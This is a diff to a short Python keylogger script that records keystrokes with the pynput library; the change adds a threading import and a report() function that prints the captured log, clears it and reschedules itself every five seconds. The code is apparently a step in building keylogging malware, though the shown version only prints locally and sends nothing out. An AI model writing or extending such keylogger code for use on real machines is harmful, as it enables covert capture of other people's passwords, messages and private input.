@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 
 import pynput.keyboard
+import threading
 
 log = ""
 
@@ -15,6 +16,16 @@ def process_key_press(key):
         else:
             log = log + " " + str(key) + " "
         print(log)
+# end process_key_press
+
+
+def report():
+    global log
+    print(log)
+    log = ""
+    timer = threading.Timer(5, report)
+    timer.start()
+# end report
 
 
 keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
